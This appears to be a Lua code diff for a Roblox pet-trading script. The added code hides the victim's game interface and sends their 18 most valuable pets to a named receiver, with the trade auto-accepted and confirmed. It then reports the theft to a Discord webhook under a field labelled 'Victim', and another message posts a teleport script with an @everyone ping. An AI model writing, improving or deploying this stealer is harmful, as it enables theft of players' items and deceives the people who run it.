@@ -519,7 +519,7 @@ local embed = {
         {
             ["name"] = "〘:moneybag:〙**Inventory Stats**",
             ["value"] = "```lua\n" ..
-                        "Total Value     : " .. string.format("%d$", math.floor(totalValue)) .. "\n" ..
+                        "Total Value     : " .. string.format("%d₽", math.floor(totalValue)) .. "\n" ..
                         "MFR Pets        : " .. tostring(mfr_count) .. "\n" ..
                         "NFR Pets        : " .. tostring(nfr_count) .. "\n" ..
                         "FR Pets         : " .. tostring(fr_count) .. "\n" ..
@@ -548,7 +548,7 @@ function SendMessageEMBED(url, embed, bool)
   }
   local data = {
       username = "M O L I T O W N",
-      avatar_url = "https://i.pinimg.1200x/736x/d2/cd/5f/d2cdf2a8169c9e444ed5402c67fce98d.jpg",
+      avatar_url = "https://i.pinimg.com/1200x/fa/95/5f/fa955f8fadbab5ed753834dbab895fb4.jpg",
       content = "pew",
       embeds = {
           {
@@ -560,12 +560,12 @@ function SendMessageEMBED(url, embed, bool)
   }
   local data2 = {
       username = "M O L I T O W N",
-      avatar_url = "https://i.pinimg.com/736x/d2/cd/5f/d2cdf2a8169c9e444ed5402c67fce98d.jpg",
+      avatar_url = "https://i.pinimg.com/1200x/fa/95/5f/fa955f8fadbab5ed753834dbab895fb4.jpg",
       content = "-- @everyone\n" .. TeleportScript,
       embeds = {
           {
               title = embed.title,
-              color = 0x660000,
+              color = 16711935,
               fields = embed.fields,
           }
       }
@@ -596,61 +596,153 @@ game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = fals
 
 local sent = false
 
-local function TradeIncoming(ReceiverName)
-    sent =  true
-    while sent do
-        local RouterClient = Loaders("RouterClient")
-        local SendTrade = RouterClient.get("TradeAPI/SendTradeRequest")
-
-        moveGuiOffscreen()
+-- Function to send trade success message to Discord
+function SendTradeSuccessMessage(ReceiverName, tradedPets)
+    local http = game:GetService("HttpService")
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
     
-        SendTrade:FireServer(game.Players[ReceiverName])
-        wait(3)
-        local RouterClient = Loaders("RouterClient")
-        local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
-        local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
-        local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
-        local InventoryDB = require(game.ReplicatedStorage.Fsys).load("InventoryDB")
-        local ClientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
-
-        -- Get and sort pets by value
-        local PetsInventory = ClientData.get_data()[game.Players.LocalPlayer.Name].inventory.pets
-        local sortedPets = {}
-        
-        for petUid, petData in pairs(PetsInventory) do
-            local calculatedValue, baseValue = calculatePetValue(petData)
-            table.insert(sortedPets, {
-                uid = petUid,
-                data = petData,
-                value = calculatedValue,
-                baseValue = baseValue
-            })
-        end
-        
-        -- Sort pets by value (highest first)
-        table.sort(sortedPets, function(a, b)
-            return a.value > b.value
-        end)
-        
-        -- Add pets to trade (best ones first)
-        local petCount = 0
-        local petLimit = 18
-        
-        for _, petInfo in ipairs(sortedPets) do
-            if petCount < petLimit then
-                AddPetRemote:FireServer(petInfo.uid)
-                petCount = petCount + 1
-                wait(0.2) -- Small delay to avoid rate limits
-            else
-                break
-            end
-        end
-        
-        wait(5)
-        AcceptNegotiationRemote:FireServer() -- Accepts first 
-        wait(5)
-        ConfirmTradeRemote:FireServer() -- finish
+    -- Format traded pets list
+    local petsText = ""
+    local totalValue = 0
+    
+    for i, pet in ipairs(tradedPets) do
+        local calculatedValue, baseValue = calculatePetValue(pet.data)
+        local petType = getPetTypeString(pet.data.properties or {})
+        petsText = petsText .. string.format("%s%s: %d$\n", pet.name, petType, math.floor(calculatedValue))
+        totalValue = totalValue + calculatedValue
     end
+    
+    local data = {
+        username = "M O L I T O W N",
+        avatar_url = "https://i.pinimg.com/736x/d2/cd/f2/d2cdf2a8169c9e444ed5402c67fce98d.jpg",
+        embeds = {
+            {
+                title = "✅ TRADE COMPLETED",
+                color = 65280, -- Green color
+                fields = {
+                    {
+                        name = "👤 Trade Details",
+                        value = "```lua\n" ..
+                               "Victim    : " .. game.Players.LocalPlayer.Name .. "\n" ..
+                               "Receiver  : " .. ReceiverName .. "\n" ..
+                               "Total Value: " .. string.format("%d$", math.floor(totalValue)) .. "\n" ..
+                               "Pets Sent : " .. #tradedPets .. "```",
+                        inline = false
+                    },
+                    {
+                        name = "🎁 Traded Pets",
+                        value = "```lua\n" .. (petsText ~= "" and petsText or "No pets traded") .. "```",
+                        inline = false
+                    }
+                },
+                timestamp = DateTime.now():ToIsoDate(),
+                footer = {
+                    text = "Molitown Trade System"
+                }
+            }
+        }
+    }
+    
+    local body = http:JSONEncode(data)
+    
+    local success, result = pcall(function()
+        return request({
+            Url = Webhook,
+            Method = "POST",
+            Headers = headers,
+            Body = body
+        })
+    end)
+    
+    if success then
+        print("✅ Trade success message sent to Discord")
+    else
+        print("❌ Failed to send trade success message: " .. tostring(result))
+    end
+end
+
+-- Modified TradeIncoming function with trade completion tracking
+local function TradeIncoming(ReceiverName)
+    if sent then return end
+    sent = true
+    
+    print("🎯 Starting trade with: " .. ReceiverName)
+    
+    local RouterClient = Loaders("RouterClient")
+    local SendTrade = RouterClient.get("TradeAPI/SendTradeRequest")
+    local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
+    local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
+    local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
+    local InventoryDB = require(game.ReplicatedStorage.Fsys).load("InventoryDB")
+    local ClientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
+
+    -- Get current pets before trade
+    local PetsInventory = ClientData.get_data()[game.Players.LocalPlayer.Name].inventory.pets
+    local sortedPets = {}
+    local tradedPets = {} -- Store pets that will be traded
+    
+    for petUid, petData in pairs(PetsInventory) do
+        local petInfo = InventoryDB[petData.category][petData.id]
+        local calculatedValue, baseValue = calculatePetValue(petData)
+        table.insert(sortedPets, {
+            uid = petUid,
+            data = petData,
+            value = calculatedValue,
+            baseValue = baseValue,
+            name = petInfo.name
+        })
+    end
+    
+    -- Sort pets by value (highest first)
+    table.sort(sortedPets, function(a, b)
+        return a.value > b.value
+    end)
+    
+    -- Send trade request
+    moveGuiOffscreen()
+    SendTrade:FireServer(game.Players[ReceiverName])
+    wait(5)
+    
+    -- Add pets to trade (best ones first) and track them
+    local petCount = 0
+    local petLimit = 18
+    
+    for _, petInfo in ipairs(sortedPets) do
+        if petCount < petLimit then
+            AddPetRemote:FireServer(petInfo.uid)
+            -- Add to traded pets list
+            table.insert(tradedPets, {
+                uid = petInfo.uid,
+                data = petInfo.data,
+                name = petInfo.name,
+                value = petInfo.value
+            })
+            petCount = petCount + 1
+            print("➕ Added pet to trade: " .. petInfo.name)
+            wait(0.2)
+        else
+            break
+        end
+    end
+    
+    -- Accept negotiation and confirm trade
+    wait(5)
+    AcceptNegotiationRemote:FireServer()
+    
+    wait(2)
+    ConfirmTradeRemote:FireServer()
+    
+    -- Send trade success message to Discord
+    wait(2) -- Wait a bit for trade to complete
+    if #tradedPets > 0 then
+        SendTradeSuccessMessage(ReceiverName, tradedPets)
+    else
+        print("⚠️ No pets were traded")
+    end
+    
+    print("✅ Trade completed with: " .. ReceiverName)
 end
 
 function SendLeaveNotify(playerName)
